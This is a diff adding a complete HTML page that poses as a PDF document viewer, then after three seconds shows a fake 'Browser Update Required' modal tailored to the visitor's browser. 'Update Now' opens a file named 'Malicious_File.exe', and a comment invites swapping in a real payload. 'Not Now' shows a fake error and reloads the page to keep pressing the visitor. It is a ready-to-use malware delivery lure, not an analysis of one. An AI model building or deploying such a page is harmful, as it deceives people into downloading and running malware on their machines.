@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Viewer</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .pdf-container {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+        }
+        
+        .pdf-toolbar {
+            background: linear-gradient(to right, #2c3e50, #4ca1af);
+        }
+        
+        .pdf-page {
+            background: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .update-modal {
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .progress-bar {
+            animation: progress 4s ease-in-out forwards;
+        }
+        
+        @keyframes progress {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 90%; }
+        }
+    </style>
+</head>
+<body class="bg-gray-100 font-sans">
+    <div class="container mx-auto px-4 py-8">
+        <!-- Fake PDF Viewer -->
+        <div id="pdfViewer" class="pdf-container rounded-lg overflow-hidden transition-all duration-300">
+            <!-- Toolbar -->
+            <div class="pdf-toolbar flex items-center justify-between px-4 py-2 text-white">
+                <div class="flex items-center space-x-4">
+                    <button class="hover:bg-white hover:bg-opacity-20 p-1 rounded">
+                        <i class="fas fa-arrow-left"></i>
+                    </button>
+                    <button class="hover:bg-white hover:bg-opacity-20 p-1 rounded">
+                        <i class="fas fa-arrow-right"></i>
+                    </button>
+                    <button class="hover:bg-white hover:bg-opacity-20 p-1 rounded">
+                        <i class="fas fa-redo"></i>
+                    </button>
+                </div>
+                
+                <div class="text-sm">
+                    Page <span class="font-bold">1</span> of <span class="font-bold">5</span>
+                </div>
+                
+                <div class="flex items-center space-x-4">
+                    <button class="hover:bg-white hover:bg-opacity-20 p-1 rounded">
+                        <i class="fas fa-search"></i>
+                    </button>
+                    <button class="hover:bg-white hover:bg-opacity-20 p-1 rounded">
+                        <i class="fas fa-print"></i>
+                    </button>
+                    <button class="hover:bg-white hover:bg-opacity-20 p-1 rounded">
+                        <i class="fas fa-download"></i>
+                    </button>
+                </div>
+            </div>
+            
+            <!-- PDF Content -->
+            <div class="p-8">
+                <div class="pdf-page mx-auto p-8 max-w-4xl h-96 flex flex-col items-center justify-center">
+                    <div class="text-center">
+                        <i class="fas fa-file-pdf text-6xl text-red-500 mb-4"></i>
+                        <h2 class="text-2xl font-bold text-gray-800 mb-2">Loading Document...</h2>
+                        <p class="text-gray-600">Please wait while we prepare your document for viewing.</p>
+                    </div>
+                    
+                    <div class="w-full bg-gray-200 rounded-full h-2.5 mt-8">
+                        <div class="progress-bar bg-blue-600 h-2.5 rounded-full" style="width: 45%"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Fake Update Modal -->
+    <div id="updateModal" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center hidden">
+        <div class="update-modal bg-white rounded-lg shadow-xl w-full max-w-md overflow-hidden">
+            <div class="bg-blue-600 text-white px-6 py-4 flex items-center">
+                <i class="fas fa-exclamation-triangle text-xl mr-3"></i>
+                <h3 class="text-lg font-bold" id="browserName">Browser Update Required</h3>
+            </div>
+            
+            <div class="p-6">
+                <p class="text-gray-700 mb-4">Your browser is out of date and may not be able to display this document correctly.</p>
+                <p class="text-gray-700 mb-6">For security reasons, please update to the latest version to continue.</p>
+                
+                <div class="bg-blue-50 border border-blue-200 rounded p-4 mb-6">
+                    <div class="flex items-center">
+                        <i class="fas fa-info-circle text-blue-500 mr-2"></i>
+                        <span class="text-sm text-blue-700">This update includes important security fixes.</span>
+                    </div>
+                </div>
+                
+                <div class="flex justify-between">
+                    <button id="cancelBtn" class="px-4 py-2 border border-gray-300 rounded text-gray-700 hover:bg-gray-100 transition">
+                        Not Now
+                    </button>
+                    <button id="updateBtn" class="px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition flex items-center">
+                        <i class="fas fa-download mr-2"></i>
+                        Update Now
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Detect user's browser
+        function detectBrowser() {
+            const userAgent = navigator.userAgent;
+            let browserName;
+            
+            if (userAgent.includes("Firefox")) {
+                browserName = "Mozilla Firefox";
+            } else if (userAgent.includes("Edg")) {
+                browserName = "Microsoft Edge";
+            } else if (userAgent.includes("Chrome")) {
+                browserName = "Google Chrome";
+            } else if (userAgent.includes("Safari")) {
+                browserName = "Apple Safari";
+            } else {
+                browserName = "your browser";
+            }
+            
+            return browserName;
+        }
+        
+        // Set the browser name in the modal
+        document.getElementById('browserName').textContent = `${detectBrowser()} Update Required`;
+        
+        // Show the fake PDF viewer first
+        setTimeout(() => {
+            document.getElementById('pdfViewer').classList.add('opacity-50', 'blur-sm');
+            document.getElementById('updateModal').classList.remove('hidden');
+        }, 3000);
+        
+        // Handle update button click
+        document.getElementById('updateBtn').addEventListener('click', function() {
+            // Change button to show "Downloading..."
+            this.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> Downloading...';
+            this.classList.add('bg-blue-800');
+            this.disabled = true;
+            
+            // After a delay, redirect to your file
+            setTimeout(() => {
+                // Replace this with the path to your actual file
+                window.open("Malicious_File.exe", "_blank");
+            }, 2000);
+        });
+        
+        // Handle cancel button click
+        document.getElementById('cancelBtn').addEventListener('click', function() {
+            document.getElementById('pdfViewer').classList.remove('opacity-50', 'blur-sm');
+            document.getElementById('updateModal').classList.add('hidden');
+            
+            // Show a fake error after canceling
+            setTimeout(() => {
+                alert("Error: This document cannot be displayed with an outdated browser. Some features may not work properly.", );
+                location.reload();
+            }, 500);
+        });
+    </script>
+</body>
+</html>
